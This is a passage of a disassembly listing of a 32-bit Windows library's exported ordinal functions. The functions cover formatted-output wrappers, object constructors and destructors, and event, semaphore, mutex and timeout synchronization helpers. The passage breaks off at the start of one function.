; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1213(int, int, int, char *Format, char Args)
		public Ordinal1213
Ordinal1213	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	5		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1213	endp

; Exported entry 1214.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1214(int, int, int, char *Format, char Args)
		public Ordinal1214
Ordinal1214	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	6		; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1214	endp

; Exported entry 1215.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1215(int, int, int, char *Format, char Args)
		public Ordinal1215
Ordinal1215	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
Format		= dword	ptr  14h
Args		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	6		; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1215	endp

; Exported entry 1200.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1200(int, int, int, int, char *Format, char Args)
		public Ordinal1200
Ordinal1200	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
Format		= dword	ptr  18h
Args		= byte ptr  1Ch

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_C]	; int
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		call	Ordinal1202
		pop	ebp
		retn
Ordinal1200	endp

; Exported entry 1201.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl Ordinal1201(int, int, int, int, char *Format, char Args)
		public Ordinal1201
Ordinal1201	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
Format		= dword	ptr  18h
Args		= byte ptr  1Ch

		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		lea	eax, [ebp+Args]
		push	eax		; Args
		push	[ebp+Format]	; Format
		push	[ebp+arg_C]	; int
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		call	Ordinal1203
		pop	ebp
		retn
Ordinal1201	endp

; Exported entry 1198.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1198
Ordinal1198	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal382
		push	offset asc_6AF5F468 ; ", "
		lea	ecx, [esi+70h]
		mov	dword ptr [esi], offset	off_6AF5F388
		call	sub_6AF3260A
		push	offset asc_6AF5F464 ; "\""
		lea	ecx, [esi+74h]
		call	sub_6AF3260A
		mov	eax, esi
		pop	esi
		retn
Ordinal1198	endp

; Exported entry 1218.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1218
Ordinal1218	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		xor	eax, eax
		push	eax		; int
		push	eax		; lpString2
		push	eax		; bInitialState
		push	1		; bManualReset
		push	eax		; lpEventAttributes
		mov	esi, ecx
		call	Ordinal1314
		mov	dword ptr [esi], offset	off_6AF5F46C
		mov	eax, esi
		pop	esi
		retn
Ordinal1218	endp

; Exported entry 1221.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1221
Ordinal1221	proc near		; CODE XREF: sub_6AF4C0A0+3p
					; Ordinal1382+3Bj ...
		mov	dword ptr [ecx], offset	off_6AF5F46C
		jmp	Ordinal1315
Ordinal1221	endp

; Exported entry 1225.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1225
Ordinal1225	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx]
		jmp	dword ptr [eax+0Ch]
Ordinal1225	endp

; Exported entry 1226.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1226
Ordinal1226	proc near		; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal1320
Ordinal1226	endp

; Exported entry 1224.
; Exported entry 1227.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1224
Ordinal1224	proc near		; CODE XREF: Ordinal1395+3j
					; DATA XREF: .rdata:off_6AF66098o
		jmp	Ordinal1321	; ccL30_1224
Ordinal1224	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C0A0(void *, char)
sub_6AF4C0A0	proc near		; DATA XREF: .rdata:off_6AF5F46Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1221
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C0B6
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C0B6:				; CODE XREF: sub_6AF4C0A0+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C0A0	endp

; Exported entry 1223.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1223
Ordinal1223	proc near		; CODE XREF: Ordinal1216+12p
					; Ordinal1217+Bp ...

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal1320
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1223	endp

; Exported entry 1216.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1216
Ordinal1216	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		push	1
		mov	dword ptr [esi], offset	off_6AF5F47C
		mov	[esi+4], ecx
		call	Ordinal1223
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1216	endp

; Exported entry 1217.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1217
Ordinal1217	proc near		; CODE XREF: sub_6AF4C141+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F47C
		mov	ecx, [ecx+4]
		push	0
		call	Ordinal1223
		retn
Ordinal1217	endp

; Exported entry 1220.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1220
Ordinal1220	proc near		; CODE XREF: Ordinal1381+Ep
					; Ordinal1408+26p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		xor	eax, eax
		push	eax		; int
		push	eax		; lpString2
		push	eax		; bInitialState
		push	1		; bManualReset
		push	eax		; lpEventAttributes
		mov	esi, ecx
		call	Ordinal1314
		push	[esp+4+arg_0]
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF5F46C
		call	Ordinal1223
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1220	endp

; Exported entry 1222.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1222
Ordinal1222	proc near		; CODE XREF: Ordinal1219+1Cp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		mov	ecx, [esp+4+arg_0]
		cmp	esi, ecx
		jz	short loc_6AF4C13B
		call	Ordinal1321
		push	eax
		mov	ecx, esi
		call	Ordinal1320

loc_6AF4C13B:				; CODE XREF: Ordinal1222+9j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1222	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C141(void *, char)
sub_6AF4C141	proc near		; DATA XREF: .rdata:off_6AF5F47Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1217
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C157
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C157:				; CODE XREF: sub_6AF4C141+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C141	endp

; Exported entry 1219.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1219
Ordinal1219	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		xor	eax, eax
		push	eax		; int
		push	eax		; lpString2
		push	eax		; bInitialState
		push	1		; bManualReset
		push	eax		; lpEventAttributes
		mov	esi, ecx
		call	Ordinal1314
		push	[esp+4+arg_0]
		mov	ecx, esi
		mov	dword ptr [esi], offset	off_6AF5F46C
		call	Ordinal1222
		mov	eax, esi
		pop	esi
		retn	4
Ordinal1219	endp

; Exported entry 1229.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1229
Ordinal1229	proc near		; CODE XREF: Ordinal136+13p
					; Ordinal135+13p ...

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5F480
		mov	[eax+4], ecx
		retn	4
Ordinal1229	endp

; Exported entry 1237.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1237
Ordinal1237	proc near		; CODE XREF: Ordinal1235+11p
					; Ordinal1234+12p
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_0]
		push	ebx
		mov	ebx, [esp+4+arg_4]
		push	esi
		push	edi
		mov	esi, ecx
		mov	edi, 100h
		push	edi		; Size
		mov	[esi+8], eax
		lea	eax, [esi+10Ch]
		push	0		; Val
		push	eax		; Dst
		mov	[esi+4], ebx
		call	memset
		push	edi		; Size
		xor	edi, edi
		add	esi, 0Ch
		push	edi		; Val
		push	esi		; Dst
		call	memset
		add	esp, 18h
		cmp	[esp+0Ch+arg_0], edi
		jbe	short loc_6AF4C1EB

loc_6AF4C1D7:				; CODE XREF: Ordinal1237+4Fj
		mov	ecx, [ebx+edi*4]
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		mov	[esi], eax
		inc	edi
		add	esi, 4
		cmp	edi, [esp+0Ch+arg_0]
		jb	short loc_6AF4C1D7

loc_6AF4C1EB:				; CODE XREF: Ordinal1237+3Bj
		pop	edi
		pop	esi
		pop	ebx
		retn	8
Ordinal1237	endp

; Exported entry 1239.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1239
Ordinal1239	proc near		; CODE XREF: Ordinal1236+6j
					; sub_6AF4C808+9p
					; DATA XREF: ...
		push	ebp
		push	esi
		xor	ebp, ebp
		push	edi
		mov	esi, ecx
		xor	edi, edi
		inc	ebp
		cmp	[esi+8], edi
		jbe	short loc_6AF4C22C
		push	ebx
		lea	ebx, [esi+10Ch]

loc_6AF4C207:				; CODE XREF: Ordinal1239+38j
		cmp	dword ptr [ebx], 0
		jz	short loc_6AF4C222
		mov	eax, [esi+4]
		mov	ecx, [eax+edi*4]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		neg	eax
		sbb	eax, eax
		inc	eax
		mov	[ebx], eax
		jz	short loc_6AF4C222
		xor	ebp, ebp

loc_6AF4C222:				; CODE XREF: Ordinal1239+19j
					; Ordinal1239+2Dj
		inc	edi
		add	ebx, 4
		cmp	edi, [esi+8]
		jb	short loc_6AF4C207
		pop	ebx

loc_6AF4C22C:				; CODE XREF: Ordinal1239+Dj
		pop	edi
		pop	esi
		mov	eax, ebp
		pop	ebp
		retn
Ordinal1239	endp

; Exported entry 1240.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1240
Ordinal1240	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, [esp+arg_0]
		mov	eax, [ecx+eax*4+10Ch]
		retn	4
Ordinal1240	endp

; Exported entry 1241.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1241
Ordinal1241	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, ecx
		mov	dword ptr [eax], offset	off_6AF5F484
		retn
Ordinal1241	endp

; Exported entry 1242.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1242
Ordinal1242	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F484
		retn
Ordinal1242	endp

; Exported entry 1243.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1243
Ordinal1243	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	edi
		xor	edi, edi
		push	edi		; int
		push	edi		; lpString2
		push	1		; lMaximumCount
		mov	esi, ecx
		push	1		; lInitialCount
		push	edi		; lpSemaphoreAttributes
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5F498
		call	Ordinal1291
		push	edi		; int
		push	edi		; lpString2
		push	edi		; bInitialOwner
		push	edi		; lpMutexAttributes
		lea	ecx, [esi+0Ch]
		call	Ordinal1303
		mov	[esi+14h], edi
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal1243	endp

; Exported entry 1244.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1244
Ordinal1244	proc near		; CODE XREF: sub_6AF4C565+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi], offset	off_6AF5F498
		call	Ordinal1304
		lea	ecx, [esi+4]
		call	Ordinal1292
		mov	dword ptr [esi], offset	off_6AF5F484
		pop	esi
		retn
Ordinal1244	endp

; Exported entry 1247.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1247
Ordinal1247	proc near		; DATA XREF: .rdata:6AF5F4A4o
					; .rdata:off_6AF66098o
		add	ecx, 4
		mov	eax, [ecx]
		jmp	dword ptr [eax+4]
Ordinal1247	endp

; Exported entry 1248.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1248
Ordinal1248	proc near		; DATA XREF: .rdata:6AF5F4A8o
					; .rdata:off_6AF66098o
		add	ecx, 4
		mov	eax, [ecx]
		jmp	dword ptr [eax+8]
Ordinal1248	endp

; Exported entry 1249.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1249
Ordinal1249	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+4]
		mov	dword ptr [esi], offset	off_6AF5F4AC
		call	Ordinal1278
		lea	ecx, [esi+24h]
		call	Ordinal1278
		push	0		; int
		push	0		; lpString2
		push	1		; bInitialState
		push	1		; bManualReset
		push	0		; lpEventAttributes
		lea	ecx, [esi+44h]
		call	Ordinal1314
		and	dword ptr [esi+4Ch], 0
		mov	eax, esi
		pop	esi
		retn
Ordinal1249	endp

; Exported entry 1250.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1250
Ordinal1250	proc near		; CODE XREF: sub_6AF4C620+3p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+44h]
		mov	dword ptr [esi], offset	off_6AF5F4AC
		call	Ordinal1315
		lea	ecx, [esi+24h]
		call	Ordinal1279
		lea	ecx, [esi+4]
		call	Ordinal1279
		mov	dword ptr [esi], offset	off_6AF5F484
		pop	esi
		retn
Ordinal1250	endp

; Exported entry 1251.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1251
Ordinal1251	proc near		; DATA XREF: .rdata:6AF5F4B0o
					; .rdata:off_6AF66098o

arg_4		= dword	ptr  8

		push	ebx
		push	esi
		push	edi
		push	[esp+0Ch+arg_4]
		mov	esi, ecx
		lea	edi, [esi+4]
		mov	eax, [edi]
		push	0FFFFFFFFh
		mov	ecx, edi
		call	dword ptr [eax+4]
		push	[esp+0Ch+arg_4]
		lea	ebx, [esi+24h]
		mov	eax, [ebx]
		push	0FFFFFFFFh
		mov	ecx, ebx
		call	dword ptr [eax+4]
		mov	eax, [esi+4Ch]
		test	eax, eax
		lea	ecx, [eax+1]
		mov	[esi+4Ch], ecx
		jnz	short loc_6AF4C346
		lea	ecx, [esi+44h]
		call	Ordinal1324

loc_6AF4C346:				; CODE XREF: Ordinal1251+30j
		mov	eax, [ebx]
		mov	ecx, ebx
		call	dword ptr [eax+8]
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+8]
		pop	edi
		xor	eax, eax
		pop	esi
		inc	eax
		pop	ebx
		retn	8
Ordinal1251	endp

; Exported entry 1252.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1252
Ordinal1252	proc near		; DATA XREF: .rdata:6AF5F4B4o
					; .rdata:off_6AF66098o
		push	esi
		push	edi
		mov	esi, ecx
		lea	edi, [esi+24h]
		mov	eax, [edi]
		push	0
		push	0FFFFFFFFh
		mov	ecx, edi
		call	dword ptr [eax+4]
		dec	dword ptr [esi+4Ch]
		jnz	short loc_6AF4C37C
		lea	ecx, [esi+44h]
		call	Ordinal1322

loc_6AF4C37C:				; CODE XREF: Ordinal1252+15j
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+8]
		xor	eax, eax
		pop	edi
		inc	eax
		pop	esi
		retn
Ordinal1252	endp

; Exported entry 1253.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1253
Ordinal1253	proc near		; DATA XREF: .rdata:6AF5F4B8o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+arg_4]
		mov	esi, ecx
		push	[esp+8+arg_0]
		lea	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	[esp+4+arg_4]
		lea	ecx, [esi+44h]
		push	[esp+8+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		xor	eax, eax
		inc	eax
		pop	esi
		retn	8
Ordinal1253	endp

; Exported entry 1254.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1254
Ordinal1254	proc near		; DATA XREF: .rdata:6AF5F4BCo
					; .rdata:off_6AF66098o
		add	ecx, 4
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		xor	eax, eax
		inc	eax
		retn
Ordinal1254	endp

; Exported entry 1256.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1256
Ordinal1256	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5F4C0
		mov	[eax+4], ecx
		retn	4
Ordinal1256	endp

; Exported entry 1231.
; Exported entry 1258.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1231
Ordinal1231	proc near		; CODE XREF: Ordinal1228+1Cp
					; Ordinal1255+1Cp
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi		; ccL30_1231
		push	[esp+4+arg_4]
		mov	esi, ecx
		mov	ecx, [esi+4]
		push	[esp+8+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		mov	[esi+8], eax
		pop	esi
		retn	8
Ordinal1231	endp

; Exported entry 1232.
; Exported entry 1259.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1232
Ordinal1232	proc near		; CODE XREF: Ordinal1230+6j
					; Ordinal1245+4Bp ...
		push	esi		; ccL30_1232
		mov	esi, ecx
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF4C408
		mov	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		neg	eax
		sbb	eax, eax
		inc	eax
		mov	[esi+8], eax

loc_6AF4C408:				; CODE XREF: Ordinal1232+7j
		xor	eax, eax
		cmp	[esi+8], eax
		pop	esi
		setz	al
		retn
Ordinal1232	endp

; Exported entry 1262.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1262
Ordinal1262	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		and	dword ptr [eax+8], 0
		mov	dword ptr [eax], offset	off_6AF5F4C4
		mov	[eax+4], ecx
		retn	4
Ordinal1262	endp

; Exported entry 1264.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1264
Ordinal1264	proc near		; CODE XREF: Ordinal1261+1Cp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+arg_4]
		mov	esi, ecx
		mov	ecx, [esi+4]
		push	[esp+8+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		mov	[esi+8], eax
		pop	esi
		retn	8
Ordinal1264	endp

; Exported entry 1265.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1265
Ordinal1265	proc near		; CODE XREF: Ordinal1263+6j
					; sub_6AF4C84C+9p
					; DATA XREF: ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+8], 0
		jz	short loc_6AF4C45B
		mov	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+10h]
		neg	eax
		sbb	eax, eax
		inc	eax
		mov	[esi+8], eax

loc_6AF4C45B:				; CODE XREF: Ordinal1265+7j
		xor	eax, eax
		cmp	[esi+8], eax
		pop	esi
		setz	al
		retn
Ordinal1265	endp

; Exported entry 236.
; Exported entry 503.
; Exported entry 668.
; Exported entry 689.
; Exported entry 703.
; Exported entry 750.
; Exported entry 755.
; Exported entry 793.
; Exported entry 878.
; Exported entry 987.
; Exported entry 1001.
; Exported entry 1027.
; Exported entry 1157.
; Exported entry 1168.
; Exported entry 1233.
; Exported entry 1260.
; Exported entry 1266.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal236
Ordinal236	proc near		; CODE XREF: Ordinal149+9Ep
					; Ordinal249+35j ...
		mov	eax, [ecx+8]	; ccL30_236
					; ccL30_503
					; ccL30_668
					; ccL30_689
					; ccL30_703
					; ccL30_750
					; ccL30_755
					; ccL30_793
					; ccL30_878
					; ccL30_987
					; ccL30_1001
					; ccL30_1027
					; ccL30_1157
					; ccL30_1168
					; ccL30_1233
					; ccL30_1260
		retn
Ordinal236	endp

; Exported entry 1267.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1267
Ordinal1267	proc near		; CODE XREF: Ordinal499+2Dp
					; Ordinal1299+26p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, ecx
		mov	ecx, [esp+arg_0]
		mov	[eax+4], ecx
		mov	ecx, [esp+arg_4]
		mov	dword ptr [eax], offset	off_6AF5F4C8
		mov	[eax+8], ecx
		retn	8
Ordinal1267	endp

; Exported entry 1268.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1268
Ordinal1268	proc near		; CODE XREF: Ordinal499+61p
					; Ordinal1299+43p ...
		mov	dword ptr [ecx], offset	off_6AF5F4C8
		retn
Ordinal1268	endp

; Exported entry 1273.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1273
Ordinal1273	proc near		; CODE XREF: Ordinal1274+2Bp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [esp+arg_4]
		cmp	eax, [esp+arg_0]
		jnb	short loc_6AF4C49A
		sub	eax, [esp+arg_0]
		dec	eax
		jmp	short locret_6AF4C49E
; ---------------------------------------------------------------------------

loc_6AF4C49A:				; CODE XREF: Ordinal1273+8j
		sub	eax, [esp+arg_0]

locret_6AF4C49E:			; CODE XREF: Ordinal1273+Fj
		retn	8
Ordinal1273	endp

; Exported entry 1274.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1274
Ordinal1274	proc near		; CODE XREF: Ordinal1272+33p
					; Ordinal1272+C0p
					; DATA XREF: ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+arg_4]
		cmp	esi, 0FFFFFFFFh
		push	edi
		mov	edi, ecx
		jnz	short loc_6AF4C4B7
		mov	eax, [ebp+arg_8]
		or	[eax], esi
		jmp	short loc_6AF4C4E6
; ---------------------------------------------------------------------------

loc_6AF4C4B7:				; CODE XREF: Ordinal1274+Dj
		test	esi, esi
		jnz	short loc_6AF4C4C0
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4C4D7
; ---------------------------------------------------------------------------

loc_6AF4C4C0:				; CODE XREF: Ordinal1274+18j
		call	ds:GetTickCount
		push	eax
		push	[ebp+arg_0]
		mov	ecx, edi
		call	Ordinal1273
		cmp	eax, esi
		jb	short loc_6AF4C4DF
		xor	eax, eax

loc_6AF4C4D7:				; CODE XREF: Ordinal1274+1Dj
		mov	ecx, [ebp+arg_8]
		and	dword ptr [ecx], 0
		jmp	short loc_6AF4C4E9
; ---------------------------------------------------------------------------

loc_6AF4C4DF:				; CODE XREF: Ordinal1274+32j
		sub	esi, eax
		mov	eax, [ebp+arg_8]
		mov	[eax], esi

loc_6AF4C4E6:				; CODE XREF: Ordinal1274+14j
		xor	eax, eax
		inc	eax

loc_6AF4C4E9:				; CODE XREF: Ordinal1274+3Cj
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
Ordinal1274	endp

; Exported entry 1228.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1228
Ordinal1228	proc near		; CODE XREF: Ordinal160+14p
					; Ordinal161+16p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_0]
		push	esi
		push	[esp+4+arg_8]
		mov	esi, ecx
		push	[esp+8+arg_4]
		and	dword ptr [esi+8], 0
		mov	dword ptr [esi], offset	off_6AF5F480
		mov	[esi+4], eax
		call	Ordinal1231
		mov	eax, esi
		pop	esi
		retn	0Ch
Ordinal1228	endp

; Exported entry 1230.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1230
Ordinal1230	proc near		; CODE XREF: Ordinal136+26p
					; Ordinal135+71p ...
		mov	dword ptr [ecx], offset	off_6AF5F480
		jmp	Ordinal1232
Ordinal1230	endp

; Exported entry 1235.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1235
Ordinal1235	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	esi
		push	[esp+4+arg_4]
		mov	esi, ecx
		push	[esp+8+arg_0]
		mov	dword ptr [esi], offset	off_6AF5F4CC
		call	Ordinal1237
		mov	eax, esi
		pop	esi
		retn	8
Ordinal1235	endp

; Exported entry 1236.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1236
Ordinal1236	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF5F4CC
		jmp	Ordinal1239
Ordinal1236	endp

; [0000001D BYTES: COLLAPSED FUNCTION unknown_libname_8. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4C565(void *, char)
sub_6AF4C565	proc near		; DATA XREF: .rdata:off_6AF5F498o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1244
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4C57B
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4C57B:				; CODE XREF: sub_6AF4C565+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4C565	endp

; Exported entry 1245.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1245
Ordinal1245	proc near		; DATA XREF: .rdata:6AF5F49Co
					; .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	[ebp+arg_4]
		mov	esi, ecx
		push	0FFFFFFFFh
		lea	eax, [esi+0Ch]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		inc	dword ptr [esi+14h]
		mov	eax, [esi+14h]
		cmp	eax, 1
		jnz	short loc_6AF4C5BF
		push	[ebp+arg_4]
		lea	ecx, [esi+4]
		push	[ebp+arg_0]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF4C5BF
		dec	dword ptr [esi+14h]
		xor	esi, esi
		jmp	short loc_6AF4C5C2
; ---------------------------------------------------------------------------

loc_6AF4C5BF:				; CODE XREF: Ordinal1245+23j
					; Ordinal1245+35j
		xor	esi, esi
		inc	esi

loc_6AF4C5C2:				; CODE XREF: Ordinal1245+3Cj
		lea	ecx, [ebp+var_C]
		mov	[ebp+var_C], offset off_6AF5F480
		call	Ordinal1232
		mov	eax, esi
		pop	esi
		leave
		retn	8
Ordinal1245	endp

; Exported entry 1246.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1246
Ordinal1246	proc near		; DATA XREF: .rdata:6AF5F4A0o
					; .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch

		push	ebp
